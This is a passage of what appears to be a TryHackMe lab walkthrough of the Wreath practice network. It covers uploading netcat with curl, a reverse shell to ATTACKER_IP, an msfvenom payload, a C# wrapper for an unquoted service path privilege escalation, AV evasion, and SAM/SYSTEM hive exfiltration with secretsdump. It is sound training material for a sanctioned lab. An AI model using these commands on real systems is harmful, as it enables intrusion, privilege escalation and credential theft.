need. There are easier options though.</li><li>We could upload netcat. This is the quick and easy option.</li></ul><p>The only problem with uploading netcat is that there are hundreds of different variants -- the version of netcat for Windows that comes with Kali is known to Defender, so we\'re going to need a different version. Fortunately there are many floating around! Let\'s use one from github, <a href="https://github.com/int0x33/nc.exe/" target="_blank">here</a>.</p><p>Clone the repository:<br /><code>git clone https://github.com/int0x33/nc.exe/</code><br /></p><p>This repository already contains pre-compiled netcat binaries for both 32 and 64 bit systems, however, this is an ideal time to talk about cross-compilation techniques. If you\'d prefer to just use the default binaries then just skip to the last section of this task and use the <code>nc64.exe</code> binary from the repository.</p><hr /><p>Cross compilation is an essential skill -- although in many ways it\'s preferable to avoid it. </p><p>First up: what is cross compilation? The idea is to compile source code into a working program to run on a different platform. In other words, cross compilation would allow us to compile a program for a different Linux kernel, a Windows program on Kali (as we\'re doing here), or even software for an embedded device or phone.</p><p>Whilst cross-compilation is a very useful skill to have, it\'s often difficult to get completely correct. Ideally we should always try to compile our code in an environment as close to the target environment as possible. For example, if an exploit or program is designed to work on CentOS 7.2, we should try to compile it in a CentOS 7.2 VM if possible. Equally, it\'s essential that we get the same arch as that of the target -- a 64 bit program won\'t work very well on a 32 bit target!</p><p>Sometimes it\'s easiest to just cross-compile, however. Generally speaking we cross compile x64 Windows programs on Kali using the <code>mingw-w64</code> package (for x64 systems). This is not installed on Kali by default, however it is available in the Kali apt repositories:<br /><code>sudo apt install mingw-w64</code><br /></p><p>This is a big package, but once it\'s installed we can start re-compiling netcat.</p><p>Much like we use <code>gcc</code> to compile binaries on Linux, we can use the <code>mingw</code> compilers to compile Windows binaries. These tend to have very descriptive (read: long) names, but the one that\'s of particular importance to us here is <code>x86_64-w64-mingw32-gcc</code>. This specifies that we want to compile a 64bit binary.<br /></p><p>Inside the nc.exe repository we downloaded, delete or move the two pre-compiled netcat binaries. The repository provides a makefile which we can use (with some small alterations) to compile the binary. Open up the <code>Makefile</code> with your favourite text editor. The first two lines specify which compiler to use:<br /><img style="width:210px" alt="The first two lines of the Makefile at their default" src="https://assets.tryhackme.com/additional/wreath-network/499921a44689.png" /></p><p>Neither of these are quite what we\'re looking for, so comment out the first line and add another line underneath:<br /><code>CC=x86_64-w64-mingw32-gcc</code><br /><img style="width:214px" alt="The first (now three) lines of the makefile after commenting out the first line and adding in the correct compiler on line three" src="https://assets.tryhackme.com/additional/wreath-network/d71f7f2fcb0e.png" /><br /></p><p>Now when we run <code>make</code> to build the binary, the correct compiler will be used to generate a x64 Windows executable. Note that there will be a lot of warnings generated by the compiler (these have been redirected to <code>/dev/null</code> in the following screenshot for readability, however, you do not need to do this). These are nothing to worry about; the compilation should still be successful.<br /><img style="width:1075.53px" alt="Demonstrating the compilation process using the make command" src="https://assets.tryhackme.com/additional/wreath-network/b29a99fd33fd.png" /><br /></p>', 'taskType': 'none', 'taskNo': 41, 'taskCreated': '2021-01-27T22:25:24.454Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<b>Bonus Question (optional): </b>Follow the steps detailed above to compile a copy of netcat.exe (otherwise use the copy already in the repo).<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>With a copy of netcat available, we now need to get it up to the target.</p><p>Start a Python webserver on your attacking machine (as demonstrated numerous times previously):<br /><code>sudo python3 -m http.server 80<br /></code></p><p></p>', 'hint': ''}, {'questionNo': 3, 'question': "<p>Despite it often being much harder to upload binaries to Windows than it is to upload to Linux, we do have a few options here.</p><ul><li>Powershell <i>might</i> work, but with AMSI in play it's a risk.</li><li>We could use the file upload point that we originally exploited to upload an unrestricted PHP file uploader (in the same way that we uploaded the original webshell, although this would be a bit of a pain with embedding the uploader in an image).</li><li>We could look for other command line tools installed on the target such as <code>curl.exe</code> or <code>certutil.exe</code>, both of which might allow for a file upload.</li></ul><p>Try to execute both of this in the webshell -- both should work.</p><p>What output do you get when running the command: <code>certutil.exe</code>?<br /></p>", 'hint': ''}, {'questionNo': 4, 'question': "<p>Certutil is a default Windows tool that is used to (amongst other things) download CA certificates. This also makes it ideal for file transfers, <i>but</i> Defender flags this as malicious. </p><p>Instead we'll stick with trusty old cURL.</p><p>Use cURL to upload your new copy of netcat to the target:<br /><code>curl http://ATTACKER_IP/nc.exe -o c:\\\\windows\\\\temp\\\\nc-USERNAME.exe<br /></code></p><p>Note the double backslashes used here. This is purely due to how the webshell handles backslashes. We need to escape the backslashes so that they are passed in as a part of the command, as opposed to escaping the letters immediately after them.<br /></p>", 'hint': ''}, {'questionNo': 5, 'question': '<p>We now have everything we need to get a reverse shell back from this target.</p><p>Set up a netcat listener on your attacking machine, then, in your webshell, use the following command:<br /><code>powershell.exe c:\\\\windows\\\\temp\\\\nc-USERNAME.exe ATTACKER_IP ATTACKER_PORT -e cmd.exe <br /></code></p><p>e.g.<br /><code>powershell.exe c:\\\\windows\\\\temp\\\\nc-MuirlandOracle.exe 10.50.73.2 443 -e cmd.exe <br /></code></p><p>This should result in a reverse shell from the target!<br /><img style="width:538px" alt="Confirmation of a reverse shell being received" src="https://assets.tryhackme.com/additional/wreath-network/ac7e2a438cd5.png" /><br /></p><p><i><b>Note: </b>In order for this to work we had to wrap the netcat command inside a powershell process to keep it from exiting early.</i></p>', 'hint': ''}, {'questionNo': 6, 'question': "<p><b>Bonus Question (optional): </b>Try generating a metasploit reverse shell and transfer it to the target (<code>msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=ATTACKING_IP LPORT=CHOOSE_A_PORT</code>) -- make sure to place it in a directory you can list (e.g. the Uploads directory of the webserver). This shell will get picked up by Defender (so don't do it anywhere else!), but it will give you a feel for how antivirus operates when it detects your payload as being malicious. </p><p>You should get an error message when trying to execute the executable and the exe will also disappear from the current directory (placed into quarantine by the AV). At this point the Administrator has also been alerted, along with the security team in a bigger organisation.<br /></p>", 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(201,207,255,.18);color:#c9cfff">AV Evasion</span> Enumeration', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/gwduHsnFdGw" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>We have a reverse shell on the third and final target -- this is cause for celebration!</p><p>We don\'t yet have full system access to the target though. As we saw when we first obtained the webshell, the webserver was (un)fortunately not running with system permissions (contrary to the Xampp defaults), which leaves us with a low-privilege account. Looks like Thomas was sensible with his security on his own PC!</p><p>This does mean that we\'re going to need to enumerate the target for privesc vectors though -- and with Defender active, we\'ll have to do it quietly. Let\'s consider our options:</p><ul><li>We could (and should) always start with a little manual enumeration. This will be relatively quiet and gives us a baseline to work with<br /></li><li>Defender would <i>definitely</i> catch a regular copy of WinPEAS; however, it would be unlikely to catch either the <code>.bat</code> version or the obfuscated <code>.exe</code> version, both of which are released in the <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/" target="_blank">PEAS repository</a> alongside the regular version</li><li>Chances are that AMSI will alert Defender if we try to load any PowerShell privesc check scripts (e.g. PowerUp), so we\'d ideally be looking for obfuscated versions of these if we were to use them</li></ul><p>We\'ll start with some manual enumeration and hopefully come up with something workable!<br /></p>', 'taskType': 'none', 'taskNo': 42, 'taskCreated': '2021-01-29T10:59:00.700Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Use the command <code>whoami /priv</code>.</p><p><b>[Research] </b>One of the privileges on this list is very famous for being used in the PrintSpoofer and Potato series of privilege escalation exploits -- which privilege is this?<br /></p>', 'hint': ''}, {'questionNo': 2, 'question': "<p>Our current user likely has this privilege due to running XAMPP as a service on the account. Unfortunately this also means that XAMPP won't be a good privesc vector in its own right, but we might be able to use the privileges it gave us!</p><hr /><p>Now use <code>whoami /groups</code> to check the current user's groups.</p><p>Unfortunately this account isn't in the Local Administrators group as that (combined with the High integrity process we're currently using) would make any further privilege escalation redundant.</p>", 'hint': ''}, {'questionNo': 3, 'question': '<p>Now that we\'ve got an idea of our own user\'s capabilities. Let\'s take a look at the box itself.</p><p>Windows services are commonly vulnerable to various attacks, so we\'ll start there. Generally speaking, it\'s unlikely that core Windows services will be vulnerable to anything -- user installed services are far more likely to have holes in them. </p><p>Let\'s start by looking for non-default services:<br /><code>wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\\Windows"</code></p><p>This lists all of the services on the system, then filters so that only services that are <i>not</i> in the <code>C:\\Windows</code> directory are returned. This should cut out most of the core Windows services (which are unlikely to be vulnerable to this kind of vulnerability), leaving us with primarily lesser-known, user-installed services.<br /></p><p>There should be a bunch of results returned here. Read through them, paying particular attention to the <code>PathName</code>\xa0 column. Notice that one of the paths does not have quotation marks around it.<br /></p><p>What is the Name (second column from the left) of this service?<br /></p>', 'hint': ''}, {'questionNo': 4, 'question': "<p>The lack of quotation marks around this service path indicates that it might be vulnerable to an <i>Unquoted Service Path</i> attack. In short, if any of the directories in that path contain spaces (which several do) and are writeable (which we are about to check), then -- assuming the service is running as the <code>NT AUTHORITY\\SYSTEM</code> account, we might be able to elevate privileges.</p><p>First of all, let's check to see which account the service runs under:<br /><code>sc qc SERVICE_NAME<br /></code></p><p>Is the service running as the local system account (Aye/Nay)?<br /></p>", 'hint': 'The SERVICE_NAME will be your answer to the previous question. \nThe answer to the question will be found in the SERVICE_START_NAME attribute.'}, {'questionNo': 5, 'question': '<p>This is looking good! </p><p>Let\'s check the permissions on the directory. If we can write to it, we are golden:<br /><code>powershell "get-acl -Path \'C:\\Program Files (x86)\\System Explorer\' | format-list"</code><br /><img style="width:552.733px" alt="Image showing the BUILTIN\\Users Allow FullControl permission which gives us full control over the directory" src="https://assets.tryhackme.com/additional/wreath-network/f0b36cf3dfba.png" /></p><p>We have full control over this directory! How strange, but hey, Thomas\' security oversight will allow us to root this target.<br /></p>', 'hint': ''}, {'questionNo': 6, 'question': "<p>In the interests of learning, it should be noted here that this is far from the only vulnerability here. By the looks of things, Thomas installed the program but couldn't be bothered entering the password for the Administrator account every time he needed to interact with it. As a result, he botched the permissions and gave every user access to every aspect of the program. </p><p>This means that we can create our unquoted service path exploit, but we could also perform attacks such as DLL hijacking, or even outright replacing the service executable with a malicious binary. </p><p>That said, we will stick to the unquoted service path vulnerability purely to avoid messing with the service itself. This way all we need to do is create our own binary then delete it, rather than alter any of the files in the service itself.</p><hr /><p><b>Bonus Question (optional): </b>Try to get a copy of WinPEAS up to the target (either the obfuscated executable file, or the batch variant) and run it. You will see that there are many more potential vulnerabilities on this target -- mainly due to patches that haven't been installed.<br /></p>", 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(201,207,255,.18);color:#c9cfff">AV Evasion</span> Privilege Escalation', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/aqBXpE0aweA" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>Let\'s recap what we found in the previous task:</p><ul><li>We have a privilege which we could almost certainly use to escalate to system permissions. The downside is that we\'d need to obfuscate the exploits in order to get them past Defender.</li><li>We have an unquoted service path vulnerability for a service running as the system account. This is ideal.</li></ul><p>We have everything we need to root this box. Let\'s do this!</p><p>Of the two vulnerabilities that are immediately available, we will work through the unquoted service path attack for one simple reason: getting a reverse shell back from this is <i>very</i> easy -- even with Defender in play. The exploits available to manipulate the privilege we found would need to be custom compiled and obfuscated in order to be useful to us; however, with the unquoted service path, all we need is one very small "wrapper" program that activates the netcat binary that we <i>already have on the target.</i> To put it another way, we just need to write a small executable that executes a system command: activating netcat and sending us a reverse shell as the owner of the service (i.e. local system). Ideally we would write a full C# service file that would integrate seamlessly with the Windows service management system. Whilst this is perfectly possible (and is by far the preferable option), for the sake of simplicity, we will stick to just creating a standalone executable. It\'s worth noting that this technique is effective at bypassing the antivirus software on the target; however, in an enterprise situation there is a good chance that it would be picked up by an intrusion detection system. In this scenario we would be looking for a more sophisticated (if similar) solution.<br /></p>Ideally we\'d be using Visual Studio here. If you happen to have a Windows host and are familiar with Visual Studio then please feel free to use it for. As not everyone has access to a Windows machine (or is comfortable installing Windows as a virtual machine), the teaching content will work with the <code>mono</code> dotnet core compiler for Linux. This can be easily installed on Kali and will allow us to compile C# executables that can be run on Windows targets. The same code will work just fine if compiled in Visual Studio, however.<p></p><hr /><p>First we need to install Mono. This can be done with:<br /><code>sudo apt install mono-devel</code><br /></p><p>If you are using the AttackBox then this should already be installed.<br /></p><p>Now, open a file called <code>Wrapper.cs</code> in your favourite text editor.</p><p>The first thing we need to do is add our "imports". These allow us to use pre-defined code from other "namespaces" -- essentially giving us access to some basic functions (e.g. input/output). At the very top if the file, add the following lines:<br /><code>using System;<br />using System.Diagnostics;<br /></code><br /></p><p>These allow us to start new processes (i.e. execute netcat).</p><p>Next we need to initialise a namespace and class for the program:<br /><code>namespace Wrapper{<br />\xa0\xa0\xa0 class Program{<br />\xa0\xa0\xa0\xa0\xa0\xa0\xa0 static void Main(){<br />\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0 //Our code will go here!<br />\xa0\xa0\xa0\xa0\xa0\xa0\xa0 }<br />\xa0\xa0\xa0 }<br />}</code><br /></p><p>We can now write the code that will call netcat. This goes inside the <code>Main()</code> function (replacing the <code>//Our code will go here!</code> line).</p><p>First, we create a new process, as well as a ProcessStartInfo object to set the parameters for the process:<br /><code>Process proc = new Process();<br />ProcessStartInfo procInfo = new ProcessStartInfo("c:\\\\windows\\\\temp\\\\nc-USERNAME.exe", "ATTACKER_IP ATTACKER_PORT -e cmd.exe");</code><br /></p><p><i>Make sure to replace the </i><code>nc-USERNAME.exe </code><i>with the name of your own netcat executable, as well as slotting in your own IP and Port!</i></p><p>With the objects created, we can now configure the process to not create it\'s own GUI Window when starting:<br /><code>procInfo.CreateNoWindow = true;</code><br /></p><p>Finally, we attach the <code>ProcessStartInfo</code> object to the process, and start the process!<br /><code>proc.StartInfo = procInfo;<br />proc.Start();</code><br /></p><p>Our program is now complete. It should look something like this:<br /><img style="width:1075.53px" alt="Screenshot of the full program with syntax highlighting" src="https://assets.tryhackme.com/additional/wreath-network/1680d2c86ef0.png" /><br /></p><p>We can now compile our program using the Mono <code>mcs</code> compiler. This is extremely simple using the package we installed earlier:<br /><code>mcs Wrapper.cs</code><br /><img style="width:685px" alt="Demonstration of compiling with the mcs Wrapper.cs command" src="https://assets.tryhackme.com/additional/wreath-network/f051e39d81f6.png" /></p>', 'taskType': 'none', 'taskNo': 43, 'taskCreated': '2021-01-29T10:59:46.681Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Write and compile a wrapper program using Mono or Visual Studio.<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>Transfer the <code>Wrapper.exe </code>\xa0 file to the target. Just to spice things up a bit, let\'s use an Impacket SMB server, rather than our usual HTTP server. If you would prefer to use the HTTP server and cURL (or another method to transfer the file) you are welcome to do so.</p><hr /><p>Impacket is a Python library that makes it very easy to interact with a wide variety of Windows services from Linux.<br /></p><p>First up, let\'s download the package:<br /><code>sudo git clone https://github.com/SecureAuthCorp/impacket /opt/impacket &amp;&amp; cd /opt/impacket &amp;&amp; sudo pip3 install .<br /></code></p><p><i><b>Note: </b>On the AttackBox Impacket is preinstalled at </i><code>/opt/impacket/impacket</code></p><p>We can now start up a temporary SMB server:<br /><code>sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword</code><br /><img style="width:921.1px" alt="Demonstration of what a successful Impacket SMB Server startup looks like. There should be a bunch of messages saying Config file parsed" src="https://assets.tryhackme.com/additional/wreath-network/99f9b77f1bf0.png" /></p><p>With this command we created a server on our IP, serving a share called "share" in the current directory. As Impacket uses SMBv1 by default, we need to specify that is use SMBv2 in order for the relatively up-to-date target to accept it. We then set a username and password for connections to the server -- again, this is due to security policies on the target requiring connections to be authenticated.</p><p>Now, in our reverse shell, we can use this command to authenticate:<br /><code>net use \\\\ATTACKER_IP\\share /USER:user s3cureP@ssword </code><br /><img style="width:457px" alt="Demonstration of the net use command. The result should include The command completed successfully" src="https://assets.tryhackme.com/additional/wreath-network/9a27791867af.png" /><br /></p><p>This authenticates with the server using the credentials we set (<code>user:s3cureP@ssword</code>). We can now copy our compiled\xa0 <code>Wrapper.exe</code> program up to the target. Due to file permissions on the normal <code>C:\\Windows\\Temp</code> directory, we are doing this from our current user\'s own <code>%TEMP%</code> directory:<br /><code>copy \\\\ATTACKER_IP\\share\\Wrapper.exe %TEMP%\\wrapper-USERNAME.exe</code><br /><img style="width:594px" alt="Confirmation that the copy operation was successful" src="https://assets.tryhackme.com/additional/wreath-network/857c1d682e0e.png" /><br /></p><p><i><b>Note: </b>We could have just executed this directly through the share -- exactly as we did with Mimikatz when dealing with the Gitserver. We are copying it here purely because we will need to have a copy on the target sooner or later anyway.</i></p><p>It is often useful to just leave an SMB server running in the background when working with Windows targets. We will use this server later, so let\'s leave it up for now.</p><p>That said, to prevent errors down the line, we should disconnect from it for the time being:<br /><code>net use \\\\ATTACKER_IP\\share /del</code><br /><img style="width:359px" alt="Confirmation that the share was deleted successfully. The message should say as much" src="https://assets.tryhackme.com/additional/wreath-network/060e1ee4ce7c.png" /></p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>Start a listener on your chosen port and try to execute \nthe wrapper manually -- you should get a reverse shell back:<br /><code>"%TEMP%\\wrapper-USERNAME.exe"</code><br /><img style="width:490px" alt="Demonstration that executing the reverse shell manually results in a reverse shell" src="https://assets.tryhackme.com/additional/wreath-network/ff8bafc56cb6.png" /><br /></p>', 'hint': ''}, {'questionNo': 4, 'question': '<p>Excellent. Our program works and is not getting caught by the antivirus. We are now ready to exploit that unquoted service path vulnerability!</p><p>Unquoted service path vulnerabilities occur due to a very interesting aspect of how Windows looks for files. If a path in Windows contains spaces and is not surrounded by quotes (e.g. <code>C:\\Directory One\\Directory Two\\Executable.exe </code>) then Windows will look for the executable in the following order:</p><p></p><ol><li><code>C:\\Directory.exe</code></li><li><code>C:\\Directory One\\Directory.exe</code></li><li><code>C:\\Directory One\\Directory Two\\Executable.exe<br /></code></li></ol><p>What this means is that if we can create a file called <code>Directory.exe</code> in the root directory, or <code>C:\\Directory One\\</code>, then we can trick Windows into executing our file instead!</p><p>Let\'s take a look at the actual path of our vulnerable service:\xa0<code>C:\\Program Files (x86)\\System Explorer\\System Explorer\\service\\SystemExplorerService64.exe</code>. There are technically three places we <i>could</i> add our program here:</p><ul><li>We could put it in the root directory and call it <code>Program.exe</code>. This is <i>very</i> unlikely to work, as the chances of having write permissions here are virtually 0.</li><li>We could put it in the <code>C:\\Program Files (x86)\\</code> directory and call it <code>System.exe</code>. Once again, this is unlikely to work because the chances of being able to write into <code>C:\\Program Files (x86)\\</code> are minimal.</li><li>We could put it in <code>C:\\Program Files (x86)\\System Explorer\\</code> and call it <code>System.exe</code>. This one will work! Remember we checked the permissions of this directory in the last task and found that we had full access? This means that we can place our wrapper into this directory, then when the service is restarted, our wrapper will be executed giving us a shell as the local system user!</li></ul><p>Before blindly copying your wrapper, check to make sure that another user isn\'t currently performing this exploit:<br /><code>dir "C:\\Program Files (x86)\\System Explorer\\"</code><br /></p><p>If you see a file called <code>System.exe</code> in the output then <i>please wait a few minutes until it disappears.</i></p><p>If there is not already an exploit in the directory then it\'s time to root this thing!</p><p>Copy your wrapper from <code>C:\\Windows\\Temp\\wrapper-USERNAME.exe </code> to <code>C:\\Program Files (x86)\\System Explorer\\System.exe </code>.<br /><code>copy %TEMP%\\wrapper-USERNAME.exe "C:\\Program Files (x86)\\System Explorer\\System.exe" </code><br /><img style="width:761px" alt="Copying the wrapper into place. It should appear under C:\\Program Files (x86)\\System Explorer\\System.exe" src="https://assets.tryhackme.com/additional/wreath-network/7faedc9a86ab.png" /></p><p><i><b>Note:</b> There is a cleanup script running on this target once every five minutes in case any hackers are too sloppy to cover up their tracks by restoring the service to working order. If your payload disappears before execution then you may have been caught by the script. If this happens, just repeat this step and the exploit should work.</i><br /></p>', 'hint': ''}, {'questionNo': 5, 'question': '<p>Our exploit is in place! We have two options to activate it:</p><ul><li>This\n service starts automatically at boot, so we could try restarting the \nentire box (although we don\'t actually have the required permissions to \ndo this to prevent users from taking the box down).</li><li>We could try\n restarting the service itself. Given the amount of access to this \nservice that Thomas has given to his account, it\'s a fair bet that we \nmight be able to do this.</li></ul><p>Failing either of these, we would be stuck waiting for someone to restart the target for us naturally.</p><p>Let\'s try stopping the service:<br /><code>sc stop SystemExplorerHelpService</code><br /><img style="width:608px" alt="Demonstration of stopping the service. There should be a STOP_PENDING message" src="https://assets.tryhackme.com/additional/wreath-network/adffd8978a57.png" /></p><p>We can stop the service, so chances are we can also start it! Set up a listener on your attacking machine then start the service:<br /><code>sc start SystemExplorerHelpService</code><br /><img style="width:699px" alt="Starting the service again. It should error out with a message about not starting in a timely fashion" src="https://assets.tryhackme.com/additional/wreath-network/210940d0f105.png" /></p><p>We have root!</p><p>Notice that we got a message telling us that the service failed to start. This is because the wrapper we uploaded isn\'t actually a real Windows service file. Our executable still gets executed, but as far as Windows is concerned, the service failed to start.<br /></p>', 'hint': ''}, {'questionNo': 6, 'question': '<p>There\'s only one thing left to do here.</p><p>Let\'s clear up after ourselves by deleting the wrapper and starting the service:<br /><code>del "C:\\Program Files (x86)\\System Explorer\\System.exe"<br />sc start SystemExplorerHelpService</code><br /><img style="width:653px" alt="Demonstration of the correct output from deleting the binary and starting the service normally" src="https://assets.tryhackme.com/additional/wreath-network/da5255d9443c.png" /></p><p>Clearing up after exploits is a good habit to get into. This also has the added bonus of being courteous to other users in the box who may be about to perform the exploit. Note that deleting the wrapper and restarting the service did not destroy the system shell!<br /></p>', 'hint': ''}, {'questionNo': 7, 'question': '<p><b>Bonus Question (optional):</b> Research how to write a real Windows Service executable in C# and try to create a wrapper (or even a full reverse shell!) that doesn\'t cause the <code>sc start</code> command to error out.</p><p>The code <a href="https://github.com/mattymcfatty/unquotedPoC" target="_blank">here</a> may help (but please do not run this as-is because it will create a new user with a known password):<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(252,190,108,.18);color:#fcbe6c">Exfiltration</span> Exfiltration Techniques &amp; Post Exploitation', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/xPG1YtQiXLc" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>Data exfiltration is something that should <i>never</i> be considered without explicit prior consent. Generally speaking, most external engagements will strongly prohibit taking data from compromised systems; however, it is worth bearing in mind that this may not be the case for internal engagements -- and some external engagements outright set targets for the red team that revolve around exfiltrating a set piece of data from the targets once compromised. Even if this is a skill that may not be used on a daily basis, it is still well worth learning.<br /></p><hr /><p>The goal of exfiltration is always to remove data from a compromised target. This could be things like passwords, keys, customer/employee data, or anything else of use or value. If the data being exfiltrated is in plain text then this could be as simple as copying and pasting the contents of a file from a remote shell into a local file. If the data is in a binary format, or otherwise can\'t just be copied and pasted, then more complicated methods must be used to exfiltrate the targeted file. </p><p>A common method for exfiltrating data is to smuggle it out within a harmless protocol, usually encoded. For example, DNS is often used to (relatively) quietly exfiltrate data. HTTPS tends to be a good option as the data will outright be encrypted before egress takes place. ICMP can be used to (very slowly) get the data out of the network. DNS-over-HTTPS is superb for data exfiltration, and even email is often used.<br /></p><p>In a real world situation an attacker will be looking to exfiltrate data as quietly as possible as there may be an Intrusion Detection System active on the compromised network which would alert the network administrators to a breach should the data be detected. For this reason an attacker is unlikely to use protocols as simple as FTP, TFTP, SMB or HTTP; however, in an unmonitored network these are still good options for moving files around.</p><p>It\'s worth noting that most command and control (C2) frameworks come with options to quietly exfiltrate data. Practically speaking, this is likely how a bad actor would be exfiltrating data, so it\'s worth keeping up to date with the current "standards" used by the various frameworks. There are also plenty of standalone tools available to automate sending and receiving obfuscated data.<br /></p><hr /><p>In short, the only limitation when it comes to exfiltration is your imagination. Whilst there are certainly common techniques available (and many tools around to take advantage of them) it will always be the new and obscure methods that are the most successful. Who knows? Maybe you\'ll even find a legitimate use for steganography!</p><p>As extra reading, <a href="https://www.pentestpartners.com/" target="_blank">PentestPartners</a> have a superb <a href="https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/" target="_blank">blog post</a> on this topic.<br /></p>', 'taskType': 'none', 'taskNo': 44, 'taskCreated': '2021-01-29T11:00:36.570Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Is FTP a good protocol to use when exfiltrating data in a modern network (Aye/Nay)?<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>For what reason is HTTPS preferred over HTTP during exfiltration?<br /></p>', 'hint': 'E___yp__on'}, {'questionNo': 3, 'question': '<hr /><p>Let\'s put this into practice!</p><p>We need some way to prove to Thomas that we\'ve compromised his PC. We could leave a note on his Desktop, or we could be fancy and give him his Administrator password hash to prove that we\'ve rooted it.<br /></p><p>There\'s no way we\'re going to get Mimikatz past Defender. We have SYSTEM access, so we could technically just disable Defender, but let\'s try to do this with as little destructiveness as possible (not least for other users on the network). What we <i>can</i> do is grab the files containing the password hashes, pass them back to our attacking machine, then dump the hashes locally. On Linux this would be a simple matter of grabbing <code>/etc/shadow</code>. On Windows it is slightly more complex than that.</p><p>Local user hashes are stored in the Windows Registry whilst the computer is running -- specically in the <code>HKEY_LOCAL_MACHINE\\SAM</code> hive. This can also be found as a file at <code>C:\\Windows\\System32\\Config\\SAM</code>, however, this should not be readable whilst the computer is running. To dump the hashes locally, we first need to save the SAM hive:<br /><code>reg.exe save HKLM\\SAM sam.bak<br /></code></p><p>This saves the hive as a file called "sam.bak" in the current directory.</p><p>Dumping the SAM hive isn\'t quite enough though -- we also need the SYSTEM hive which contains the boot key for the machine:<br /><code>reg.exe save HKLM\\SYSTEM system.bak<br /></code></p><p>With both Hives dumped, we can exfiltrate them back to our attacking machine to dump the hashes out of sight of Defender.</p><p>It\'s up to you how you choose to exfiltrate the files. Given this is a home network with no monitoring in place, an SMB server is recommended. Connect to your SMB server using your SYSTEM reverse shell with the <code>net use </code> command. You can now either save the files directly to your own drive, or move the files to your attacking machine if you already dumped the hives, e.g:<br /><code>reg.exe save HKLM\\SAM \\\\ATTACKING_IP\\share\\sam.bak </code><br />or<br /><code>move sam.bak \\\\ATTACKING_IP\\share\\sam.bak<br /></code></p><p><i><b>Note:</b> You may encounter an error when reconnecting. This is due to the way that Windows handles cached credentials:<br /></i><img style="width:646px" alt="System Error 1312 relating to a logon session not existing" src="https://assets.tryhackme.com/additional/wreath-network/52376f416ede.png" /><br /><i>System error 1312 can usually be solved by connecting using an arbitrary domain. For example, specifying </i><code>/USER:domain\\user</code><i> rather than just the username. The same SMB server will still work here; however, Windows sees it as a different user account and thus allows the new connection.</i><br /></p><p>With both files stored locally, we can now dump some hashes! Make sure you delete the .bak files from the target if you copied them rather than moving them.</p><p>Once again, remember to disconnect from the SMB server!<br /></p>', 'hint': ''}, {'questionNo': 4, 'question': '<p>There are a variety of tools that could do this job for us. The most reliable is (as is often the case), a script from the Impacket library: <code>secretsdump.py </code>.</p><p>Let\'s use this against our dumped hives:<br /><code>python3 /opt/impacket/examples/secretsdump.py -sam PATH/TO/SAM_FILE -system PATH/TO/SYSTEM_FILE LOCAL<br /></code></p><p><img style="width:921.8px" alt="Demonstration of using Impacket against the dumped hives. Password hashes are obtained." src="https://assets.tryhackme.com/additional/wreath-network/28853bc2be23.png" /></p><p>Each local account on the target is shown here, in a format of Username, RID, LM hash, NT hash -- separated by colons. We are interested in the <i>NT </i>hashes -- the last section (blurred). As a side note: <code>31d6cfe0d16ae931b73c59d7e0c089c0</code> is an empty hash, and indicates that the account is not activated. These can thus be discounted.</p><hr /><p>What is the Administrator NT hash for this target?<br /></p>', 'hint': ''}, {'questionNo': 5, 'question': "<p>We have now completed everything we set out to accomplish: demonstrating\n that Wreath's network is vulnerable. Take this chance to go through the\n network and clean up after yourself. Aside from being courteous to other users of the network, this is also something you should always do in real life; we wouldn't want to make things easy for an attacker, would we?<br /></p><p>Remove all the tools, shells, payloads, accounts, and any other remnants you left behind.</p>", 'hint': ''}]}, {'taskTitle': '<span class="badge badge-soft-info size-16">Conclusion</span> Debrief &amp; Report', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/JKbUlVTA8uA" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>We started this assignment with three targets. One Linux, two Windows.</p><p>All three have now been fully compromised -- well done!</p><p>Hopefully you\'ve been taking notes and are now about to start writing a report on the topic. If you\'re not familiar with pentest reports, the following task may come in handy. Additionally, Offensive Security have also published an example penetration test report <a href="https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf" target="_blank">here</a>, and there is a whole community-curated repository of public reports <a href="https://github.com/juliocesarfort/public-pentesting-reports" target="_blank">here</a> should you need more inspiration.<br 